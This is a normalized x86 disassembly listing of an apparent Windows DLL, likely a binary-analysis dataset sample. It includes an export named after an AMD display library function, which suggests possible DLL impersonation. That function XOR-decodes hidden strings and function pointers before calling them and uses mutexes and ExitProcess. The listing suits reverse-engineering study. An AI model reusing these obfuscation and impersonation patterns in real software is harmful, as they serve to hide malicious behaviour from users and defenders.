mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_10037fc8
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003ea65
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10038065
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_100420c4
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_10038090
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_100270f0
mov [ esi + 0x4 ] 0x2
cmp [ ebx + 0x20 ] 0x8
jb r-xdata
add ebx 0xc
mov ebx [ ebx + 0xc ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_10078600
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10038120
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_1005522b
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1002a905
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
sar eax 0x1
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_100381c9
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10038260
push ebp
mov ebp esp
push ecx
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xd4 ]
call eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x6c ]
push esi
push eax
call edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
test eax eax
js r-xdata
lea eax [ esi + 0x2 ]
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov esp ebp
pop ebp
retn 0xc
sub_10038317
push 0xc
push r--data
call sub_10078b50
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_10078b95
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100383ad
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
ADL_Adapter_CrossdisplayInfoX2_Set
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10082980
mov eax [ fs : 0x0 ]
push eax
sub esp 0x588
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x580 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x598 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
lea edx [ esp + 0x34 ]
mov [ esp + 0x10 ] ecx
push edx
mov ecx ebx
mov [ esp + 0x18 ] eax
call sub_100212a0
xor eax eax
mov [ esp + 0x5a0 ] eax
cmp [ esp + 0x70 ] eax
je r-xdata
cmp [ rw-data ] eax
je r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov esi [ r--data ]
xor cl cl
call sub_10020d00
test eax eax
je r-xdata
mov [ rw-data ] eax
mov dl [ esi + eax ]
xor dl cl
xor dl 0x78
inc cl
mov [ esp + eax + 0xd0 ] dl
movzx eax cl
cmp eax 0x22
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ esp + 0xf2 ] 0x0
xor eax eax
nop
mov eax [ esp + 0x60 ]
push r--data
xor edi edi
lea ecx [ esp + 0x54 ]
call sub_1005e510
lea ebx [ edi + 0x8 ]
test eax eax
je r-xdata
mov esi 0x8
cmp [ esp + 0x64 ] esi
jb r-xdata
mov dl [ esi + eax ]
xor dl cl
xor dl 0x62
inc cl
mov [ esp + eax + 0xc8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
mov edi 0xf
xor esi esi
mov eax ebx
mov [ esp + 0xce ] 0x0
mov [ esp + 0x2c ] edi
mov [ esp + 0x28 ] esi
mov [ esp + 0x18 ] 0x0
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax [ esp + 0x44 ]
push r--data
xor edi edi
lea ecx [ esp + 0x38 ]
call sub_1005e510
test eax eax
je r-xdata
mov eax [ esp + 0x50 ]
cmp [ esp + 0x64 ] ebx
jae r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] esi
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
lea ecx [ esp + 0x20 ]
call sub_1005d090
mov [ esp + 0x5a0 ] 0x1
lea eax [ esp + 0xc8 ]
mov [ esp + 0xa4 ] edi
mov [ esp + 0xa0 ] esi
mov [ esp + 0x90 ] 0x0
lea ecx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xffffffff
push edi
lea edx [ esp + 0x3c ]
push edx
mov ecx rw-data
call sub_1001c310
push eax
call sub_10012a60
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x50 ]
mov ecx [ esp + 0x598 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x580 ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea eax [ esp + 0xcc ]
push eax
lea ecx [ esp + 0x98 ]
call sub_1005d090
lea ecx [ esp + 0x90 ]
push ecx
lea edx [ esp + 0x78 ]
push r--data
push edx
mov [ esp + 0x5ac ] 0x2
call sub_10025a80
add esp 0xc
push eax
mov edx r--data
lea esi [ esp + 0xb0 ]
mov [ esp + 0x5a4 ] 0x3
call sub_1002a6e0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x5ac ] 0x4
call sub_10040f60
mov ebx 0x10
cmp [ esp + 0xc0 ] ebx
jb r-xdata
cmp [ esp + 0x64 ] ebx
jb r-xdata
mov edi [ GetModuleFileNameW@IAT ]
push 0x104
lea ecx [ esp + 0xf8 ]
push ecx
push eax
call edi
test eax eax
je r-xdata
cmp [ esp + 0x64 ] ebx
jb r-xdata
call sub_10065045
add esp 0x4
xor esi esi
mov [ esp + 0xc0 ] edi
mov [ esp + 0xbc ] esi
mov [ esp + 0xac ] 0x0
cmp [ esp + 0x88 ] ebx
jb r-xdata
mov eax [ esp + 0xac ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] ebx
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_10065045
add esp 0x4
lea edx [ esp + 0xf4 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ esp + 0xf4 ]
push eax
call [ PathAddBackslashW@IAT ]
lea ecx [ esp + 0xf4 ]
push ecx
call [ SetCurrentDirectoryW@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] edi
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] ebx
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_10065045
add esp 0x4
mov [ esp + 0x5a0 ] 0x1
mov [ esp + 0x88 ] edi
mov [ esp + 0x84 ] esi
mov [ esp + 0x74 ] 0x0
cmp [ esp + 0xa4 ] ebx
jb r-xdata
mov ecx [ esp + 0x74 ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
call sub_100148d0
test eax eax
jne r-xdata
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
xor esi esi
xor edi edi
jmp r-xdata
mov edx [ esp + 0x90 ]
push edx
call sub_10065045
add esp 0x4
call sub_10018f30
push 0xdc8
call sub_1005ac7e
add esp 0x4
test eax eax
je r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0xd0 ]
push eax
lea edx [ edi + ecx ]
push edx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
xor eax eax
push rw-data
mov esi eax
call sub_10017890
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
xor edi edi
cmp ecx edi
je r-xdata
add edi 0x108
inc esi
cmp edi 0x6720
jl r-xdata
call sub_10022b00
test al al
je r-xdata
lea edx [ esp + 0x2fc ]
mov eax 0x10d
call sub_1001bb80
jmp r-xdata
mov [ rw-data ] eax
call sub_10013280
call sub_10021910
call sub_10002f50
test eax eax
je r-xdata
cmp [ esp + 0x2c ] ebx
jae r-xdata
cmp [ esp + 0x2c ] ebx
jae r-xdata
mov [ esp + 0x5a0 ] 0x0
cmp [ esp + 0x2c ] ebx
jb r-xdata
call sub_1004d8d0
test eax eax
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
mov ecx [ ebp + 0x14 ]
mov edx [ rw-data ]
push ecx
push eax
push edx
jmp r-xdata
lea eax [ esp + 0x18 ]
mov edx [ ebp + 0x14 ]
push edx
push eax
push ecx
lea eax [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
push ecx
call sub_10065045
add esp 0x4
call sub_1005b2f0
push 0x104
lea eax [ esp + 0x388 ]
push eax
push 0x0
call edi
test eax eax
je r-xdata
call sub_10005b40
mov edx [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
imul esi esi 0x108
mov ecx [ rw-data ]
mov edx [ esi + ecx + 0x104 ]
push eax
call edx
cmp [ esp + 0x2c ] ebx
jb r-xdata
mov esi 0x8
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] 0xf
cmp [ esp + 0x64 ] esi
jb r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ rw-data ]
push 0x104
lea ecx [ esp + 0xf8 ]
push ecx
push edx
call edi
test eax eax
je r-xdata
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ rw-data ]
push eax
call [ ReleaseMutex@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov al 0x38
mov [ esp + 0x10 ] ecx
xor [ esp + 0x10 ] al
xor [ esp + 0x11 ] al
xor [ esp + 0x12 ] al
xor [ esp + 0x13 ] al
push edx
call [ esp + 0x14 ]
push edx
call [ ReleaseMutex@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0x10 ] eax
mov al 0x38
xor [ esp + 0x10 ] al
xor [ esp + 0x11 ] al
xor [ esp + 0x12 ] al
xor [ esp + 0x13 ] al
push ecx
call [ esp + 0x14 ]
jmp r-xdata
xor edx edx
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] edi
mov [ esp + 0x50 ] dx
cmp [ esp + 0x48 ] esi
jb r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ rw-data ]
push eax
call sub_100495f0
push rw-data
push rw-data
push eax
mov edx rw-data
mov ebx rw-data
lea esi [ esp + 0x100 ]
lea ecx [ esp + 0x390 ]
call sub_10037310
add esp 0xc
push 0x138
mov [ esp + 0x18 ] eax
call sub_1005ac7e
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x5a0 ] 0x5
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
push eax
xor edx edx
cmp [ rw-data ] 0x8
mov ecx [ rw-data ]
jae r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
push rw-data
push rw-data
push ecx
mov edx rw-data
mov ecx rw-data
mov edi eax
call sub_1003c360
mov edx eax
jmp r-xdata
mov ecx rw-data
inc edi
add esi 0x208
cmp edi 0x1e
jb r-xdata
mov eax esi
lea edx [ eax + 0x2 ]
mov [ esp + 0x5a0 ] 0x0
fld [ rw-data ]
push ecx
fstp [ esp ]
mov [ rw-data ] edx
call sub_10024280
fld [ rw-data ]
push ecx
fstp [ esp ]
call sub_10041fb0
mov edx [ edx + 0x110 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
xor edi edi
mov esi rw-data
lea eax [ esi - 0x3e1c ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
call sub_10037d10
mov ecx [ rw-data ]
mov eax [ ecx + 0x110 ]
push eax
call [ ReleaseMutex@IAT ]
call sub_10065f10
push 0x0
push 0x0
push 0x0
push sub_10045970
push 0x0
push 0x0
call sub_10011407
mov edx [ rw-data ]
mov cl 0x38
mov [ esp + 0x28 ] edx
xor [ esp + 0x28 ] cl
xor [ esp + 0x29 ] cl
xor [ esp + 0x2a ] cl
xor [ esp + 0x2b ] cl
add esp 0x18
push eax
call [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x78 ]
call sub_10008520
add esp 0x4
mov [ esp + 0x5a0 ] 0x6
mov eax [ esp + 0x84 ]
test eax eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
call sub_1003e1e0
test eax eax
je r-xdata
cmp [ esp + 0x88 ] 0x10
mov ecx [ esp + 0x74 ]
jae r-xdata
lea edx [ esi + 0x3cf0 ]
mov eax edx
lea ebx [ eax + 0x2 ]
call sub_100403c0
lea ecx [ esp + 0x74 ]
call sub_10021250
mov ebx 0x8
push 0x0
push eax
push ecx
mov ecx [ rw-data ]
push ecx
xor edx edx
xor ecx ecx
call sub_10010790
lea ecx [ esp + 0x74 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
je r-xdata
movzx eax [ edi * 2 + rw-data ]
test ax ax
je r-xdata
mov ecx [ edi * 4 + rw-data ]
push ecx
mov ecx [ edi * 4 + rw-data ]
push ecx
movzx ecx [ edi + rw-data ]
push ecx
push eax
lea eax [ esi - 0x3e1c ]
push eax
lea eax [ esi - 0x7b0c ]
push eax
mov ecx esi
call sub_1000f8d0
sub_10038c10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x4 ]
xor eax eax
test edx edx
je r-xdata
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ esi ]
mov ecx edi
lea esp [ esp ]
cmp eax 0xffffffff
je r-xdata
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
pop edi
pop ebx
lea ecx [ edi + eax * 4 ]
sub edx eax
lea eax [ edx * 4 - 0x4 ]
push eax
lea edx [ ecx + 0x4 ]
push edx
push ecx
call sub_10077d10
add esp 0xc
dec [ esi + 0x4 ]
cmp [ ecx ] ebx
je r-xdata
pop edi
pop ebx
pop esi
pop ebp
retn
sub_10038c70
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x21c ] ecx
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
push 0x1
push eax
call sub_10019870
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
mov eax 0x2
call sub_10050930
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_10078970
lea ecx [ ebp - 0x210 ]
push ecx
call sub_1000b569
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x10
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_1006b860
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
call sub_1000b569
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10030af0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x218 ]
push 0x1
push ecx
mov ecx [ ebp - 0x21c ]
push edx
lea edx [ ebp - 0x20c ]
call sub_10047ba0
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10038ea0
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_10012991
mov esi [ eax ]
call sub_10012991
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_100509dd
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_10012991
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_10012991
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jns r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_10038f10
push ebp
mov ebp esp
push 0xffffffff
push sub_1008265b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
lea ecx [ edi + 0x3b0 ]
mov [ ebp - 0x2c4 ] edi
mov [ ebp - 0x2bc ] eax
call sub_10024b10
lea eax [ ebp - 0x29c ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x194 ]
lea edx [ ebp - 0x29c ]
mov ecx eax
xor ebx ebx
mov esi 0x104
sub edx ecx
test esi esi
jne r-xdata
mov cl [ eax + edx ]
test cl cl
je r-xdata
mov [ eax ] 0x0
test ebx ebx
jns r-xdata
dec eax
mov ebx 0x8007007a
mov [ eax ] cl
inc eax
dec esi
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov eax 0x1
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x71
inc cl
mov [ ebp + eax - 0x28 ] dl
movzx eax cl
cmp eax 0x13
jb r-xdata
mov [ ebp - 0x15 ] 0x0
mov eax 0x104
lea ecx [ ebp - 0x194 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
inc ecx
dec eax
jne r-xdata
mov eax 0x2
jmp r-xdata
mov ecx 0x104
sub ecx eax
lea eax [ ebp - 0x28 ]
push eax
mov eax 0x104
sub eax ecx
lea ecx [ ebp + ecx - 0x194 ]
mov edx 0x7fffffff
call sub_1006b7a0
test eax eax
jns r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
push 0x3039
lea ecx [ ebp - 0x194 ]
push ecx
mov esi edi
mov [ ebp - 0x2c0 ] 0x0
call sub_10013a40
test eax eax
jne r-xdata
mov edx [ ebp - 0x2bc ]
mov ebx [ edx ]
mov eax edx
mov eax [ eax + 0x4 ]
cmp ebx eax
je r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0xe1
call sub_1001bb80
mov eax 0x3
jmp r-xdata
mov ecx edi
call sub_10049da0
test eax eax
jne r-xdata
mov edx [ ebx + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax [ edi + 0x3a0 ]
mov esi [ eax ]
push 0x2
xor ebx ebx
push ebx
push ebx
add esi 0x20
call sub_1001e4c0
mov ecx [ edi + 0x3a0 ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
mov ecx [ edx + 0x4 ]
test [ eax + ecx + 0x2c ] 0x6
jne r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x67
call sub_1001bb80
mov eax 0x8
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax [ r--data ]
mov ecx [ r--data ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov ecx [ eax + ecx + 0x58 ]
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
push 0x1
push 0x1
push ebx
push ebx
lea eax [ ebp - 0x2c ]
push eax
call edx
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx [ ebx + 0x10 ]
lea ecx [ eax + ecx * 2 ]
cmp edx 0x8
jb r-xdata
mov edx [ ebp - 0x2c ]
add edx [ ebp - 0x24 ]
mov ecx [ edi + 0x3a0 ]
push ebx
mov [ edi + 0x8 ] edx
mov esi [ ecx ]
push ebx
push ebx
add esi 0x20
call sub_1001e4c0
mov edx [ edi + 0x8 ]
push edx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx eax
mov eax [ edi + 0x8 ]
cdq
push edx
push eax
mov eax [ edi + 0x3a0 ]
push ecx
mov [ edi + 0x4 ] ecx
mov ecx [ eax ]
add ecx 0x20
push ecx
call sub_1000e7f0
mov eax [ ebp - 0x2c0 ]
mov esi [ ebp - 0x2c4 ]
call sub_1000a0b0
test eax eax
jne r-xdata
lea edi [ ebp - 0x2b8 ]
mov edx [ ebp - 0x2c0 ]
push edx
push ecx
push eax
lea eax [ ebp - 0x2b8 ]
xor esi esi
push eax
mov [ ebp - 0x2a4 ] 0xf
mov [ ebp - 0x2a8 ] esi
mov [ ebp - 0x2b8 ] 0x0
call sub_1003b330
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x2a4 ] 0x10
mov edi [ ebp - 0x2b8 ]
jae r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x2a4 ] 0x10
jb r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x60
call sub_1001bb80
mov [ ebp - 0x2c0 ] 0x2
mov edx [ ebp - 0x2bc ]
add ebx 0x24
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov ecx [ ebp - 0x2b8 ]
push ecx
call sub_10065045
add esp 0x4
mov edi esi
sub_10039230
push ebp
mov ebp esp
push ecx
push ebx
push edi
xor ebx ebx
push ebx
push 0x80
